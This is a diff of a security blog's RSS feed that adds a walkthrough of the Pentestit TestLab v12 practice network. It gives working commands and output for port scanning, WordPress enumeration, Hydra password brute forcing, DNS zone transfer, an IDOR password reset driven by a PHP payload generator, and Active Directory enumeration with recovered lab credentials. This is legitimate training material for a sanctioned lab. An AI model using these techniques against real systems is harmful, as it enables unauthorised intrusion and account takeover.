@@ -6,9 +6,527 @@
 </description>
     <link>http://snoopysecurity.github.io/</link>
     <atom:link href="http://snoopysecurity.github.io/feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Sat, 05 Jan 2019 00:32:52 +0000</pubDate>
-    <lastBuildDate>Sat, 05 Jan 2019 00:32:52 +0000</lastBuildDate>
+    <pubDate>Fri, 01 Feb 2019 12:30:34 +0000</pubDate>
+    <lastBuildDate>Fri, 01 Feb 2019 12:30:34 +0000</lastBuildDate>
     <generator>Jekyll v3.2.1</generator>
+    
+      <item>
+        <title>Pentestit TestLab V12 Walkthrough</title>
+        <description>&lt;p&gt;This walkthrough shows the process I used to capture and complete some systems within the Pentestit v12 test lab. This walkthrough contains my field notes I took when I was working through the box. The “Test lab” is presented as a computer network of virtual companies containing widely of distributed misconfigurations and vulnerabilities. Players will need to discover vulnerable hosts, exploit them and then find the token.&lt;/p&gt;
+
+&lt;h3 id=&quot;mail-token&quot;&gt;Mail Token&lt;/h3&gt;
+
+&lt;p&gt;The first step consists of the reconnaissance phase as ports scanning, banner grabbing, misconfigurations and so on. Once you create a free account, Pentestit will provide you a VPN configuration which you can then use to connect to the TestLab network. Once connected, the Lab gateways are &lt;strong&gt;192.168.101.12&lt;/strong&gt; and &lt;strong&gt;192.168.101.13&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;A port scan of the .12 system shows the following services open.&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:# nmap -sV 192.168.101.12 -T4 -p- -vv
+
+Completed Service scan at 13:58, 8.28s elapsed (4 services on 1 host)
+NSE: Script scanning 192.168.101.12.
+NSE: Starting runlevel 1 (of 2) scan.
+Initiating NSE at 13:58
+Completed NSE at 13:58, 1.49s elapsed
+NSE: Starting runlevel 2 (of 2) scan.
+Initiating NSE at 13:58
+Completed NSE at 13:58, 0.00s elapsed
+Nmap scan report for site.test.lab (192.168.101.12)
+Host is up, received echo-reply ttl 62 (0.12s latency).
+Scanned at 2019-01-19 13:53:27 EST for 329s
+Not shown: 65531 filtered ports
+Reason: 65531 no-responses
+PORT     STATE SERVICE REASON         VERSION
+25/tcp   open  smtp    syn-ack ttl 61 Postfix smtpd
+80/tcp   open  http    syn-ack ttl 61 nginx 1.14.2
+143/tcp  open  imap    syn-ack ttl 61 Dovecot imapd
+8080/tcp open  http    syn-ack ttl 61 nginx
+Service Info: Host: -mail.test.lab
+
+Read data files from: /usr/bin/../share/nmap
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;Browsing to port 80 shows a WordPress site in use and a Roundcube Webmail instance was discoverable on port 8080. After quickly discovering the virtual host is called site.test.lab, the /etc/hosts file can be modified to include this information. WPScan can be used to enumerate the WordPress installation&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:# wpscan --url http://site.test.lab --random-user-agent
+_______________________________________________________________
+        __          _______   _____
+        \ \        / /  __ \ / ____|
+         \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+           \  /\  /  | |     ____) | (__| (_| | | | |
+            \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+        WordPress Security Scanner by the WPScan Team
+                       Version 3.3.1
+          Sponsored by Sucuri - https://sucuri.net
+      @_WPScan_, @ethicalhack3r, @erwan_lr, @_FireFart_
+_______________________________________________________________
+
+[+] URL: http://site.test.lab/
+[+] Started: Fri Jan 18 18:18:44 2019
+
+Interesting Finding(s):
+
+[+] http://site.test.lab/
+ | Interesting Entry: Server: nginx/1.14.2
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100%
+
+[+] http://site.test.lab/readme.html
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] WordPress version 4.9.8 identified.
+ | Detected By: Rss Generator (Passive Detection)
+ |  - http://site.test.lab/?feed=rss2, &amp;lt;generator&amp;gt;https://wordpress.org/?v=4.9.8&amp;lt;/generator&amp;gt;
+ |  - http://site.test.lab/?feed=comments-rss2, &amp;lt;generator&amp;gt;https://wordpress.org/?v=4.9.8&amp;lt;/generator&amp;gt;
+ |
+ | [!] 7 vulnerabilities identified:
+ |
+ | [!] Title: WordPress &amp;lt;= 5.0 - Authenticated File Delete
+ |     Fixed in: 4.9.9
+ |     References:
+ |      - https://wpvulndb.com/vulnerabilities/9169
+ |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20147
+ |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
+ |
+ | [!] Title: WordPress &amp;lt;= 5.0 - Authenticated Post Type Bypass
+ |     Fixed in: 4.9.9
+ |     References:
+ |      - https://wpvulndb.com/vulnerabilities/9170
+ |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20152
+ |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
+ |      - https://blog.ripstech.com/2018/wordpress-post-type-privilege-escalation/
+ |
+ | [!] Title: WordPress &amp;lt;= 5.0 - PHP Object Injection via Meta Data
+ |     Fixed in: 4.9.9
+ |     References:
+ |      - https://wpvulndb.com/vulnerabilities/9171
+ |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20148
+ |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
+ |
+ | [!] Title: WordPress &amp;lt;= 5.0 - Authenticated Cross-Site Scripting (XSS)
+ |     Fixed in: 4.9.9
+ |     References:
+ |      - https://wpvulndb.com/vulnerabilities/9172
+ |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20153
+ |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
+ |
+ | [!] Title: WordPress &amp;lt;= 5.0 - Cross-Site Scripting (XSS) that could affect plugins
+ |     Fixed in: 4.9.9
+ |     References:
+ |      - https://wpvulndb.com/vulnerabilities/9173
+ |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20150
+ |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
+ |      - https://github.com/WordPress/WordPress/commit/fb3c6ea0618fcb9a51d4f2c1940e9efcd4a2d460
+ |
+ | [!] Title: WordPress &amp;lt;= 5.0 - User Activation Screen Search Engine Indexing
+ |     Fixed in: 4.9.9
+ |     References:
+ |      - https://wpvulndb.com/vulnerabilities/9174
+ |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20151
+ |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
+ |
+ | [!] Title: WordPress &amp;lt;= 5.0 - File Upload to XSS on Apache Web Servers
+ |     Fixed in: 4.9.9
+ |     References:
+ |      - https://wpvulndb.com/vulnerabilities/9175
+ |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20149
+ |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
+ |      - https://github.com/WordPress/WordPress/commit/246a70bdbfac3bd45ff71c7941deef1bb206b19a
+
+[+] WordPress theme in use: twentyseventeen
+ | Location: http://site.test.lab/wp-content/themes/twentyseventeen/
+ | Last Updated: 2019-01-09T00:00:00.000Z
+ | Readme: http://site.test.lab/wp-content/themes/twentyseventeen/README.txt
+ | [!] The version is out of date, the latest version is 2.0
+ | Style URL: http://site.test.lab/wp-content/themes/twentyseventeen/style.css?ver=4.9.8
+ | Style Name: Twenty Seventeen
+ | Style URI: https://wordpress.org/themes/twentyseventeen/
+ | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
+ | Author: the WordPress team
+ | Author URI: https://wordpress.org/
+ |
+ | Detected By: Css Style (Passive Detection)
+ |
+ | Version: 1.7 (80% confidence)
+ | Detected By: Style (Passive Detection)
+ |  - http://site.test.lab/wp-content/themes/twentyseventeen/style.css?ver=4.9.8, Match: 'Version: 1.7'
+
+[+] Enumerating All Plugins
+[+] Checking Plugin Versions
+
+[i] Plugin(s) Identified:
+
+[+] wp-survey-and-poll
+ | Location: http://site.test.lab/wp-content/plugins/wp-survey-and-poll/
+ | Last Updated: 2019-01-14T22:50:00.000Z
+ | [!] The version is out of date, the latest version is 1.5.8
+ |
+ | Detected By: Urls In Homepage (Passive Detection)
+ |
+ | Version: 1.5.7.8 (50% confidence)
+ | Detected By: Readme - ChangeLog Section (Aggressive Detection)
+ |  - http://site.test.lab/wp-content/plugins/wp-survey-and-poll/readme.txt
+
+[+] Enumerating Config Backups
+ Checking Config Backups - Time: 00:00:00 &amp;lt;===============================================================================================&amp;gt; (21 / 21) 100.00% Time: 00:00:00
+
+[i] No Config Backups Found.
+
+[+] Finished: Fri Jan 18 18:18:52 2019
+[+] Requests Done: 53
+[+] Memory used: 60.688 MB
+[+] Elapsed time: 00:00:07
+root@kali:~# 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;Spidering of the application also revealed additional information regarding the themes and plugins in use. However, these were found hard to exploit due to the use of a Web Application Firewall within the WordPress application. However, by looking at the main WordPress webpage. It was possible to identify a email/username.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/pentestit/1.JPG&quot; alt=&quot;alt text&quot; title=&quot;wordpressuser&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Using this username, brute force attacks can now be conducted to possibly get access to to to the Roundcube Webmail instance, WordPress dashboard, or the IMAP. After trying all three potential targets, the password of the info user was successfully brute forced by leveraging the IMAP service.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:/# hydra -l info@test.lab -P /root/rockyou.txt imap://192.168.101.12/PLAIN
+Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2019-01-19 14:08:43
+[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking imap://192.168.101.12:143/PLAIN
+[143][imap] host: 192.168.101.12   login: info@test.lab   password: 123456789
+1 of 1 target successfully completed, 1 valid password found
+[WARNING] Writing restore file because 3 final worker threads did not complete until end.
+[ERROR] 3 targets did not resolve or could not be connected
+[ERROR] 16 targets did not complete
+Hydra (http://www.thc.org/thc-hydra) finished at 2019-01-19 14:08:50
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Using the found password, it was possible to successfully login to the Roundcube Webmail as the &lt;strong&gt;info&lt;/strong&gt; user.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/pentestit/2.JPG&quot; alt=&quot;alt text&quot; title=&quot;roundcube&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Looking through the info user’s emails, it was possible to find the Mail token, and get hold of a VPN configuration file. A possible username called &lt;strong&gt;sviridov@test.lab&lt;/strong&gt; was also found my looking through the inbox.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/pentestit/3.JPG&quot; alt=&quot;alt text&quot; title=&quot;vpnconfig&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;dns-token&quot;&gt;DNS Token&lt;/h3&gt;
+
+&lt;p&gt;Using the found credentials and the VPN config file, a VPN connection can be established and tunnelled through the already established VPN connection. This can be done as seen below&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/pentestit/4.JPG&quot; alt=&quot;alt text&quot; title=&quot;secondvpnconnection&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;By looking around, the new subnet that is accessible seems to be &lt;code class=&quot;highlighter-rouge&quot;&gt;172.16.0.0/16&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:# ip ro show dev tun1
+10.11.0.1 via 10.11.0.25 
+10.11.0.25 proto kernel scope link src 10.11.0.26 
+172.16.0.0/16 via 10.11.0.25 
+root@kali:~# 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;A nmap scan with the fast (-F) option can be conducted to quickly find open services. It is worth disabling host discovery within nmap for better coverage.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~# nmap -F -n 172.16.0.0/16 -v -Pn
+[SHORTENED FOR ABBREVIATION]
+
+Nmap scan report for 172.16.0.10
+Host is up (0.10s latency).
+Not shown: 99 filtered ports
+PORT   STATE SERVICE
+80/tcp open  http
+
+Nmap scan report for 172.16.0.17
+Host is up (0.10s latency).
+Not shown: 89 closed ports
+PORT     STATE SERVICE
+22/tcp   open  ssh
+25/tcp   open  smtp
+53/tcp   open  domain
+80/tcp   open  http
+88/tcp   open  kerberos-sec
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+143/tcp  open  imap
+389/tcp  open  ldap
+445/tcp  open  microsoft-ds
+8080/tcp open  http-proxy
+
+Nmap scan report for 172.16.2.10
+Host is up (0.051s latency).
+Not shown: 99 filtered ports
+PORT   STATE SERVICE
+53/tcp open  domain
+
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;The results discovered multiple DNS servers. One of these DNS servers allowed zone transfers.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:# dig axfr test.lab @172.16.2.10
+
+; &amp;lt;&amp;lt;&amp;gt;&amp;gt; DiG 9.11.4-P2-3-Debian &amp;lt;&amp;lt;&amp;gt;&amp;gt; axfr test.lab @172.16.2.10
+;; global options: +cmd
+test.lab.		21600	IN	SOA	test.lab. ad.test.lab. 69 5 30 21600 60
+test.lab.		21600	IN	NS	ns1.test.lab.
+test.lab.		21600	IN	NS	ns2.test.lab.
+test.lab.		21600	IN	A	172.16.0.17
+_kerberos._tcp.dc._msdcs.test.lab. 21600 IN SRV	0 0 88 test.lab.
+_ldap._tcp.dc._msdcs.test.lab. 21600 IN	SRV	0 0 389 test.lab.
+gc._msdcs.test.lab.	21600	IN	A	172.16.0.17
+_ldap._tcp.gc._msdcs.test.lab. 21600 IN	SRV	0 0 3268 test.lab.
+_kerberos._tcp.test.lab. 21600	IN	SRV	0 0 88 test.lab.
+_kpasswd._tcp.test.lab.	21600	IN	SRV	0 0 464 test.lab.
+_ldap._tcp.test.lab.	21600	IN	SRV	0 0 389 test.lab.
+_kerberos._udp.test.lab. 21600	IN	SRV	0 0 88 test.lab.
+_kpasswd._udp.test.lab.	21600	IN	SRV	0 0 464 test.lab.
+ad.test.lab.		21600	IN	A	172.16.0.17
+db.test.lab.		21600	IN	A	172.16.0.30
+dc.test.lab.		21600	IN	A	172.16.0.17
+dns.test.lab.		21600	IN	A	172.16.0.17
+dns.test.lab.		21600	IN	A	172.16.2.10
+_ldap._tcp.ForestDnsZones.test.lab. 21600 IN SRV 0 0 389 test.lab.
+helpdesk.test.lab.	21600	IN	A	172.16.0.10    
+my.test.lab.		21600	IN	A	172.16.0.10
+ns1.test.lab.		21600	IN	A	172.16.0.17
+ns2.test.lab.		21600	IN	A	172.16.2.10
+site.test.lab.		21600	IN	A	172.16.0.10
+[TOKENREMOVEDFROM].test.lab. 21600 IN	A	127.0.0.1
+test.lab.		21600	IN	SOA	test.lab. ad.test.lab. 69 5 30 21600 60
+;; Query time: 169 msec
+;; SERVER: 172.16.2.10#53(172.16.2.10)
+;; WHEN: Sat Jan 19 18:14:26 EST 2019
+;; XFR size: 26 records (messages 1, bytes 778
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;The DNS token was discovered within the given results.&lt;/p&gt;
+
+&lt;h3 id=&quot;helpdesk-token&quot;&gt;Helpdesk Token&lt;/h3&gt;
+
+&lt;p&gt;The IP address and the correct hostname for the helpdesk system can be discovered through the obtain DNS records. A quick port scan revealed that this machine is hosting a web application&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/pentestit/5.JPG&quot; alt=&quot;alt text&quot; title=&quot;helpdesk&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The previously obtained info user credentials can be used to login in to this application&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/pentestit/6.png&quot; alt=&quot;alt text&quot; title=&quot;helpdesk&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Observing the change password area of the helpdesk discovered the use of an obfuscated ID parameter which could potentially be vulnerable to Insecure Direct Object Reference.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/pentestit/6.JPG&quot; alt=&quot;alt text&quot; title=&quot;changepass&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The value of the ID parameter was found to be Base64 decoded. An decoded example of this value can be seen below.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/pentestit/7.JPG&quot; alt=&quot;alt text&quot; title=&quot;changepass&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;By iterating through a list of parameter values, it could be possible to reset the password for the sviridov user. It should be noted that to generate valid values for the ID parameter, a list of numbers should be generate with a new line at the end. The following PHP code can be used to generate these values.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;?php  
+for ($x = 0; $x &amp;lt;= 500; $x++) {
+    echo base64_encode($x.'
+');
+    echo '&amp;lt;br&amp;gt;';
+}
+?&amp;gt;  
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;This payload list can now be used with Burp Intruder to reset the password of the sviridov user.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/pentestit/8.JPG&quot; alt=&quot;alt text&quot; title=&quot;intruder&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The helpdesk token and the network password of the sviridov user can be found by logging in to the Helpdesk application with the changed password.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/pentestit/9.JPG&quot; alt=&quot;alt text&quot; title=&quot;sviridov&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;ad-token&quot;&gt;AD Token&lt;/h3&gt;
+
+&lt;p&gt;The domain controller IP address in use for the TEST domain can be found by looking through the DNS records found earlier through the DNS Zone transfer. By conducting a authenticated NetBIOS using enum4linux, information about the domain can be gathered including the AD token.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:/var/www/html# enum4linux -u 'sviridov@test.lab' -p '5BEiBBtrNq695A!6u5zUR5KxC' -U 172.16.0.17 -a
+Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sun Jan 27 10:02:59 2019
+
+ ========================== 
+|    Target Information    |
+ ========================== 
+Target ........... 172.16.0.17
+RID Range ........ 500-550,1000-1050
+Username ......... 'sviridov@test.lab'
+Password ......... '5BEiBBtrNq695A!6u5zUR5KxC'
+Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
+
+
+ =================================================== 
+|    Enumerating Workgroup/Domain on 172.16.0.17    |
+ =================================================== 
+[+] Got domain/workgroup name: TEST
+
+ ==================================== 
+|    Session Check on 172.16.0.17    |
+ ==================================== 
+[+] Server 172.16.0.17 allows sessions using username 'sviridov@test.lab', password '5BEiBBtrNq695A!6u5zUR5KxC'
+
+ ========================================== 
+|    Getting domain SID for 172.16.0.17    |
+ ========================================== 
+Domain Name: TEST
+Domain Sid: S-1-5-21-583374519-1042395902-3096671009
+[+] Host is part of a domain (not a workgroup)
+
+ ============================ 
+|    Users on 172.16.0.17    |
+ ============================ 
+index: 0x1 RID: 0x45e acb: 0x00000010 Account: token_fopekr0mf	Name: 	Desc: 
+index: 0x2 RID: 0x1f4 acb: 0x00000010 Account: Administrator	Name: 	Desc: Built-in account for administering the computer/domain
+index: 0x3 RID: 0x457 acb: 0x00000010 Account: lomonosov	Name: 	Desc: 
+index: 0x4 RID: 0x452 acb: 0x00000010 Account: sviridov	Name: 	Desc: 
+index: 0x5 RID: 0x454 acb: 0x00000010 Account: sidorov	Name: 	Desc: 
+index: 0x6 RID: 0x1f6 acb: 0x00000011 Account: krbtgt	Name: 	Desc: Key Distribution Center Service Account
+index: 0x7 RID: 0x456 acb: 0x00000010 Account: petrov	Name: 	Desc: 
+index: 0x8 RID: 0x1f5 acb: 0x00000215 Account: Guest	Name: 	Desc: Built-in account for guest access to the computer/domain
+index: 0x9 RID: 0x450 acb: 0x00000010 Account: info	Name:  info	Desc: 
+
+user:[Administrator] rid:[0x1f4]
+user:[Guest] rid:[0x1f5]
+user:[krbtgt] rid:[0x1f6]
+user:[info] rid:[0x450]
+user:[sviridov] rid:[0x452]
+user:[sidorov] rid:[0x454]
+user:[petrov] rid:[0x456]
+user:[lomonosov] rid:[0x457]
+user:[token_fopekr0mf] rid:[0x45e]
+enum4linux complete on Sun Jan 27 10:03:06 2019
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h3 id=&quot;vpn-token&quot;&gt;VPN Token&lt;/h3&gt;
+
+&lt;p&gt;The initial information provided by Pentestit was that lab gateways are &lt;strong&gt;192.168.101.12&lt;/strong&gt; and &lt;strong&gt;192.168.101.13&lt;/strong&gt;. 192.168.101.13 was accessible by downloading the VPN configuration obtained through the mail token challenge.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/pentestit/10.JPG&quot; alt=&quot;alt text&quot; title=&quot;secondvpn&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The VPN configuration can be modified to connect to the 192.168.101.12 VPN. The sviridov credentials previously obtained will need to be used for successful authentication.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~# ip ro show dev tun1
+10.12.0.1 via 10.12.0.145 
+10.12.0.145 proto kernel scope link src 10.12.0.146 
+172.16.0.0/16 via 10.12.0.145 
+192.168.0.0/24 via 10.12.0.145
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;The same 172 network range seems to be accessible but network Access Control Lists might not been in place. A port scan of this range revealed the following systems&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Host is up, received user-set (0.074s latency).
+Scanned at 2019-01-27 13:20:40 EST for 66s
+Not shown: 99 filtered ports
+Reason: 99 no-responses
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT   STATE SERVICE REASON
+80/tcp open  http    syn-ack
+
+Nmap scan report for 172.16.0.11
+Host is up, received user-set (0.058s latency).
+Scanned at 2019-01-27 13:20:40 EST for 68s
+Not shown: 98 filtered ports
+Reason: 98 no-responses
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT    STATE SERVICE REASON
+25/tcp  open  smtp    syn-ack
+143/tcp open  imap    syn-ack
+
+Nmap scan report for 172.16.0.14
+Host is up, received user-set (0.076s latency).
+Scanned at 2019-01-27 13:20:40 EST for 67s
+Not shown: 98 filtered ports
+Reason: 98 no-responses
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack
+80/tcp open  http    syn-ack
+
+Nmap scan report for 172.16.0.17
+Host is up, received user-set (0.067s latency).
+Scanned at 2019-01-27 13:20:40 EST for 62s
+Not shown: 75 closed ports, 19 filtered ports
+Reason: 75 conn-refused and 19 no-responses
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT    STATE SERVICE      REASON
+22/tcp  open  ssh          syn-ack
+53/tcp  open  domain       syn-ack
+135/tcp open  msrpc        syn-ack
+139/tcp open  netbios-ssn  syn-ack
+389/tcp open  ldap         syn-ack
+445/tcp open  microsoft-ds syn-ack
+
+Nmap scan report for 172.16.1.10
+Host is up, received user-set (0.080s latency).
+Scanned at 2019-01-27 14:26:04 EST for 180s
+Not shown: 99 filtered ports
+Reason: 99 no-responses
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT   STATE SERVICE REASON
+80/tcp open  http    syn-ack
+
+Nmap scan report for 172.16.1.12
+Host is up, received user-set (0.063s latency).
+Scanned at 2019-01-27 14:26:04 EST for 179s
+Not shown: 98 filtered ports
+Reason: 98 no-responses
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack
+80/tcp open  http    syn-ack
+
+Nmap scan report for 172.16.1.15
+Host is up, received user-set (0.068s latency).
+Scanned at 2019-01-27 14:26:04 EST for 182s
+Not shown: 99 filtered ports
+Reason: 99 no-responses
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT   STATE SERVICE REASON
+80/tcp open  http    syn-ack
+
+Nmap scan report for 172.16.1.20
+Host is up, received user-set (0.087s latency).
+Scanned at 2019-01-27 14:26:04 EST for 179s
+Not shown: 98 filtered ports
+Reason: 98 no-responses
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT     STATE SERVICE  REASON
+22/tcp   open  ssh      syn-ack
+8000/tcp open  http-alt syn-ack
+
+Nmap scan report for 172.16.1.25
+Host is up, received user-set (0.15s latency).
+Scanned at 2019-01-27 14:26:04 EST for 177s
+Not shown: 99 filtered ports
+Reason: 99 no-responses
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack
+
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Browsing to port 80 using a web browser revealed the following token&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/pentestit/11.JPG&quot; alt=&quot;alt text&quot; title=&quot;vpnhost&quot; /&gt;&lt;/p&gt;
+
+</description>
+        <pubDate>Mon, 21 Jan 2019 09:00:00 +0000</pubDate>
+        <link>http://snoopysecurity.github.io/netsec/2019/01/21/10_pentestit_v12_walkthrough.html</link>
+        <guid isPermaLink="true">http://snoopysecurity.github.io/netsec/2019/01/21/10_pentestit_v12_walkthrough.html</guid>
+        
+        <category>pentestit</category>
+        
+        
+        <category>Netsec</category>
+        
+      </item>
     
       <item>
         <title>Top 10 OSINT Tools/Sources for Security Folks</title>
